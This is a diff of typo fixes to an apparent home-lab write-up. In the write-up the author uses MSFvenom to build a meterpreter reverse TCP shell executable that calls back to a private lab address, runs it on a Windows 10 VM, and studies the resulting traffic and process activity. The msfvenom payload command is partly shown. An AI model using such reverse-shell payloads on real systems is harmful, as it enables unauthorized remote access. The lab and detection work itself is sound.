@@ -2,7 +2,7 @@
 
 ![Pasted image 20240502094200](https://github.com/lm3nitro/Projects/assets/55665256/92706414-50e2-4614-85b6-e2b7560e74d7)
 
-MSFvenom is a versitile tool in the Metaspolit Framwork  used for generated varios types of payloads and shellcode. It allows penetration tested and security researchers to create custom payloads for exploitation, bypassing defenses, and gaining remote access to target systems. 
+MSFvenom is a versatile tool in the Metasploit Framework used for generated various types of payloads and shellcode. It allows penetration tested and security researchers to create custom payloads for exploitation, bypassing defenses, and gaining remote access to target systems. 
 
 Key Features:
 + Payload Generation
@@ -10,14 +10,14 @@ Key Features:
 + Customization
 
 ### Scope:
-I will installing and configuring MSFveno to create a customer reverse TCP shell payload on the attacking host (Linux OS) that will then be downloaded and executed by the victim host (Windows 10 OS). I will then analyze the traffic using various tools to see how the connection looks like and the payload execution at the packet level. 
+I will install and configure MSFvenom to create a customer reverse TCP shell payload on the attacking host (Linux OS) that will then be downloaded and executed by the victim host (Windows 10 OS). I will then analyze the traffic using various tools to see how the connection looks like and the payload execution at the packet level. 
 
 ### Tools and Technology:
 Linux OS, Win 10 OS, Wireshark, Process Hacker, TCPview and MSFvenom
 
 ## Getting started with MSFvenon
 
-Once MSFvenon is installed and runnig, using the -h lists the available options
+Once MSFvenon is installed and running, using the -h lists the available options
 
 ```
 msfvenom -h
@@ -51,7 +51,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.91.134 lport=4444 
 
 ![Pasted image 20240501140620](https://github.com/lm3nitro/Projects/assets/55665256/061f31b8-12a7-4832-bfff-aaea596191b5)
 
-Once that was complete, I can also verified my file information:
+Once that was complete, I also verified my file information:
 
 ```
 file lm3nitro_shell.exe
@@ -93,7 +93,7 @@ After having downlaoded the executable, I then executed it:
 
 ![Pasted image 20240501140042](https://github.com/lm3nitro/Projects/assets/55665256/a6a5713d-2966-45d3-a7d6-d5a0bfdc43bb)
 
-On the attacking host (msfvenom) I could see that it had been executed and details on the host regarding the user, OS version/build, etc. Also, using the shell command allowed me to successfully remotely connect to the target host over the network:
+On the attacking host ( MSFvenom) I could see that it had been executed and details on the host regarding the user, OS version/build, etc. Also, using the shell command allowed me to successfully remotely connect to the target host over the network:
 
 ![Pasted image 20240501144904](https://github.com/lm3nitro/Projects/assets/55665256/afbfd0d0-7bef-4d2a-a5ce-62afd0217761)
 
@@ -103,7 +103,7 @@ Going back to Wireshark, I can see when the payload was executed. I was able to 
 
 ![Pasted image 20240501141911](https://github.com/lm3nitro/Projects/assets/55665256/810d5f2f-9b7f-4116-8d73-a41915740313)
 
-I also used Process Hacker. Process Hacker is a free tool for Windows that helps manage and monitor what is happeneing. Windows by default comes with Task Manager, however, this is a more enhanced version of that. It provides more detailed information about running programs, CPU and memory. 
+I also used Process Hacker. Process Hacker is a free tool for Windows that helps manage and monitor what is happening. Windows by default comes with Task Manager, however, this is a more enhanced version of that. It provides more detailed information about running programs, CPU and memory. 
 
 Taking a look at the lm3nitro_shell.exe that is running, I was also able to see the location, command line, time that it has running, and the Parent:
 
@@ -116,10 +116,10 @@ I also used TCPView (utility within Sysinternals) which lists all active network
 
 ### Summary:
 
-I was able to install and configure MSFvenom and use it to create a rever tcp shell payload which was then downloaded by the victim (Windows 10 PC) to create a remote connection to it. While this was being downloaded and executed by the victim I had Wireshark running in the background to capture the traffic and have a look at how this malicious traffic looks at the packet level.  
+I was able to install and configure MSFvenom and use it to create a reverse tcp shell payload which was then downloaded by the victim (Windows 10 PC) to create a remote connection to it. While this was being downloaded and executed by the victim I had Wireshark running in the background to capture the traffic and have a look at how this malicious traffic looks at the packet level.  
 
 Having done this allowed me to get a better understanding on attackers and a view into the malicious payloads that are readily available on tools such as MSFvenom. I was able to see how these payloads can be used to exploit vulnerable targets. I was able to further explore attack vectors and defense evasion techniques all in a safe and controlled environment. 
 
-Overall, MSFvenom is a great tool becuase it really simplifies the creation of custom payloads for penetration testing and security assessments. I was ablen to generate malicious code tailored to my specific target. MSFvenom allows security professionals and ethical hackers to simulate real-world attacks and scenarions. One thing that I like is that it can be integrated with tools sucks as Metasploit to make it even more powerful. 
+Overall, MSFvenom is a great tool because it really simplifies the creation of custom payloads for penetration testing and security assessments. I was able to generate malicious code tailored to my specific target. MSFvenom allows security professionals and ethical hackers to simulate real-world attacks and scenarios. One thing that I like is that it can be integrated with tools sucks as Metasploit to make it even more powerful. 
 
 
